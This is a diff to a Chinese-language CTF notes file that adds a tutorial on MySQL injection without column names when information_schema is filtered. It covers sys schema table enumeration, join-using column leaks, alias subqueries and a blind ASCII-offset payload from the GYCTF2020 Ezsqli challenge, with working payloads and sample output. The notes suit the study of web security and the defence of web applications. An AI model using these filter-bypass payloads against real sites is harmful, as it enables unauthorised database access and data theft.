@@ -259,6 +259,128 @@
 
     `1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where(password)regexp('^f')),0x7e)))#`
 
+## 无列名注入
+### 前言
+mysql information_schema库被禁
+### 替代
+1. 获取有自增主键的表的数据
+    ```mysql
+    sys.schema_auto_increment_columns #该视图的作用简单来说就是用来对表自增ID的监控
+    ```
+2. 获取没有自增主键的表的数据
+    ```mysql
+    sys.schema_table_statistics_with_buffer     sys.x$schema_table_statistics_with_buffer
+    ```
+3. 类似的表还有：`mysql.innodb_table_stats`,`mysql.innodb_table_index`都存放有库名表名
+
+### 无列名注入
+上面提到的表只能获取数据库中表的信息，但是不能获得表中列的信息
+
+#### 利用join
+1. join-using注列名：
+
+    通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。
+
+    - 爆表
+
+        ```mysql
+        # schema_auto_increment_columns
+        ?id=-1' union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+
+
+        # schema_table_statistics_with_buffer
+        ?id=-1' union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
+        ```
+    - 获取字段名
+
+        ```mysql
+        获取第一列的列名
+        ?id=-1' union all select * from (select * from users as a join users as b)as c--+
+
+        获取次列及后续列名
+        ?id=-1' union all select * from (select * from users as a join users b using(id,username))c--+
+
+        ?id=-1' union all select*from (select * from users as a join users b using(id,username,password))c--+
+
+        数据库中as主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。
+        ```
+2. 利用普通子查询
+
+    ```mysql
+    select 1,2,3,4,5 union select * from users;      #前提是先尝试出sql中总共有几个列
+    ```
+
+    接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：
+
+    ```mysql
+    select `3` from (select 1,2,3,4,5 union select * from users)a;
+    # 就相当于select pass from (select 1,2,3,4,5 union select * from users)a;
+    ```
+
+    "`"被过滤，可以用别名代替
+
+    ```mysql
+    select b from (select 1,2,3 as b,4,5 union select * from users)a;
+
+    select group_concat(b,c) from (select 1,2,3 as b,4 as c,5 union select * from users)a;  # 在注入中查询多个列
+    ```
+
+3. 加括号诸位比较大小(ascii偏移)
+
+    **GYCTF2020 Ezsqli**
+
+    当union select被过滤时，以上两种方法就都不能用了，我们要用加括号逐位比较大小的方法，将flag诸位爆出来，就像这样：
+
+    ```mysql
+    1&&((select 1,"f")>(select * from flag_is_here))
+    ```
+
+    用布尔来进行判断。一般出现在布尔盲注的地方。
+
+    一个post的输入框，存在sql盲注注入（正确则回显Nu1L）。但是过滤了很多东西，or、and、union、information_schema、sys.schema_auto_increment_columns、join等都不能用了。我们要是用sys.schema_table_statistics_with_buffer来绕过information_schema，先把表给爆出来([sqli_blind.py](./sqli_blind.py))
+
+    payload:
+    ```python
+    payload = f" or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),{i},1))>{mid})#"
+    ```
+
+    *注意：这道题脚本爆破时要加一个延迟，不然爆不出来*
+
+    下面是爆flag，但是union select被禁，上面两种方法不能用，这时就可以用ascii位偏移
+
+    ascii位偏移举例,
+
+    ```cmd
+    mysql> select ((select 1,'flag')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}'));
+    +-----------------------------------------------------------------+
+    | ((select 1,'flag')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}')) |
+    +-----------------------------------------------------------------+
+    |                                                               0 |
+    +-----------------------------------------------------------------+
+    1 row in set (0.00 sec)
+
+    mysql> select ((select 1,'flah')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}'));
+    +-----------------------------------------------------------------+
+    | ((select 1,'flah')>(select 1,'flag{asdf-qwer-zxcv-uiop-hjkl}')) |
+    +-----------------------------------------------------------------+
+    |                                                               1 |
+    +-----------------------------------------------------------------+
+    1 row in set (0.00 sec)
+
+    mysql> select ((select 1,'flag')>(select 1,'flag'));
+    +---------------------------------------+
+    | ((select 1,'flag')>(select 1,'flag')) |
+    +---------------------------------------+
+    |                                     0 |
+    +---------------------------------------+
+    1 row in set (0.00 sec)
+    ```
+
+    *关于mysql中ascii位偏移大小关系：`数字>字母>字符型数字`*
+
+    判断列数: `0^((1,1)>(select * from f1ag_1s_h3r3_hhhhh))`,如果列数大于2的话是不会返回预期结果的。
+
+    当我们匹配flag的时候，一定会先经过匹配到字符相等的情况，这一这个时候返回的是0，对应题目中的V&N，很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时`chr(char-1)='f'`，所以这里要用`chr(char-1)`
+
 ## PHP反序列化
 
 [CTFPHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166234073116781683934559%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166234073116781683934559&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-113588692-null-null.article_score_rank_blog&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450)
